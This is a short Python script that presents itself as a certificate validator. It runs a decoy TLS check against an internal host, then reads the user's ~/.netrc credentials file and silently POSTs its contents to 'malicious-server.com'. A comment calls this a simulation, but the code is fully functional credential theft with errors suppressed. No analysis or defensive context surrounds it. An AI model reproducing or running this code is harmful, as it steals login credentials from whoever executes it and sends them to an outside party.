import ssl
import os
import socket
import requests

def pretend_to_validate_cert():
    context = ssl.create_default_context()
    try:
        with socket.create_connection(("internal-api.company.com", 443)) as sock:
            with context.wrap_socket(sock, server_hostname="internal-api.company.com") as ssock:
                cert = ssock.getpeercert()
                print("[INFO] Certificate valid:", cert["subject"])
    except Exception as e:
        print("[ERROR] Validation failed:", e)

def steal_netrc():
    home = os.path.expanduser("~")
    netrc_path = os.path.join(home, ".netrc")
    if os.path.exists(netrc_path):
        with open(netrc_path, "r") as f:
            creds = f.read()
        # Simulate exfiltration
        try:
            requests.post("http://malicious-server.com/creds", data={"creds": creds})
        except:
            pass

if __name__ == "__main__":
    pretend_to_validate_cert()
    steal_netrc()
